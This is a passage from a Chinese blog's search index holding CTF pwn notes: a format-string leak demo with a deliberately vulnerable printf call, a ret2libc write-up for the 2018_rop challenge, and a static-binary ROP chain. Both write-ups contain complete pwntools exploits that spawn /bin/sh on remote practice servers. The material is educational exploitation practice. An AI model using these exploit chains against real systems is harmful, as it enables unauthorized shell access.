<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们的输入为:</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">AAAA<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span></span><br></pre></td></tr></table></figure>

<p>程序的输出为：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">AAAA61fe4c</span>,<span class="number">61</span>ffcc,<span class="number">76</span>e<span class="number">4</span>d<span class="number">250</span>,<span class="number">70734</span>fbf,fffffffe,<span class="number">76</span>e<span class="number">473</span>da,<span class="number">41414141</span>,<span class="number">252</span>c<span class="number">7825</span>,<span class="number">78252</span>c<span class="number">78</span>,<span class="number">2</span>c<span class="number">78252</span>c,<span class="number">252</span>c<span class="number">7825</span></span><br></pre></td></tr></table></figure>

<p>成功打印出地址</p>
<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>对于格式化字符串漏洞的主要利用有：使程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖、任意地址内存覆盖。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>铁人三项(第五赛区)_2018_rop</title>
    <url>/2021/06/25/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>查看保护机制，开了NX，32位</p>
<p><img src="/img/image-20210625101308461.png" alt="image-20210625101308461"></p>
<p>IDA打开，shift+F12查找字符串，没有发现/bin/sh</p>
<p><img src="/img/image-20210625101526643.png" alt="image-20210625101526643"></p>
<p>再查看main函数中，东西不多，挨个查看里面的函数，发现vulnerable_function();函数里面有蹊跷</p>
<p><img src="/img/image-20210625101817170.png" alt="image-20210625101817170"></p>
<p>这里发现漏洞，read的buf长度为0x100，而写入的参数大小是0x88，能溢出0x78个长度，足够构造rop攻击 </p>
<p><img src="/img/image-20210625101909489.png" alt="image-20210625101909489"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>先通过write函数地址泄露出libc版本，然后再在libc版本里算出system函数和/bin/sh的地址，最后通过栈溢出覆盖返回地址填上system(‘/bin/sh’)，夺权。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28086</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>脚本一跑，cat flag就得到flag了</p>
<p><img src="/img/image-20210625105710279.png" alt="image-20210625105710279"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>静态编译rop题目解题法</title>
    <url>/2021/12/20/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91rop%E9%A2%98%E7%9B%AE%E8%A7%A3%E9%A2%98%E6%B3%95/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="Linux系统调用-int-80h（int-0x80）"><a href="#Linux系统调用-int-80h（int-0x80）" class="headerlink" title="Linux系统调用 int 80h（int 0x80）"></a>Linux系统调用 int 80h（int 0x80）</h2><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>在计算机中，系统调用（英语：system call），又称为系统呼叫，指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。 系统调用提供了用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信。</p>
<p>Linux的系统调用通过int 80h实现，用系统调用号来区分入口函数。 操作系统实现系统调用的基本过程是：<br>      应用程序调用库函数（API）；<br>      API将系统调用号存入EAX，然后通过中断调用使系统进入内核态；<br>      内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；<br>     系统调用完成相应功能，将返回值存入EAX，返回到中断处理函数；<br>     中断处理函数返回到API中；<br>     API将EAX返回给应用程序。</p>
<h5 id="很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。"><a href="#很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。" class="headerlink" title="很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。"></a><del>很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。</del></h5><h2 id="判断静态编译"><a href="#判断静态编译" class="headerlink" title="判断静态编译"></a>判断静态编译</h2><p><strong>只要ida打开看起来很复杂的，都是静态编译的结果。这种情况下的好处就是不会调用libc中的东西，所以我们不用泄露libc版本来利用里libc函数。</strong></p>
<h2 id="解决题目"><a href="#解决题目" class="headerlink" title="解决题目"></a>解决题目</h2><p>ROPgadget有一个很强大的功能，直接利用程序中的片段拼凑rop链。</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">ROPgadget</span> --<span class="comment">binary</span> <span class="comment">rop</span> --<span class="comment">ropchain</span></span><br></pre></td></tr></table></figure>

<h3 id="例题：inndy-rop（假的，只是为了静态编译放这儿的）"><a href="#例题：inndy-rop（假的，只是为了静态编译放这儿的）" class="headerlink" title="例题：inndy_rop（假的，只是为了静态编译放这儿的）"></a>例题：inndy_rop<del>（假的，只是为了静态编译放这儿的）</del></h3><p>32位文件，静态编译，开NX，所以直接</p>
<p><img src="/img/1643119949088.png" alt="1643119949088"></p>
<p> 最后稍作修改 </p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import <span class="keyword">pack</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">q</span> = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25783</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">def payload():</span><br><span class="line">    p = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span> + <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">shell = payload()</span><br><span class="line">q.sendline(shell)</span><br><span class="line">q.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/img/1643119981017.png" alt="1643119981017"></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
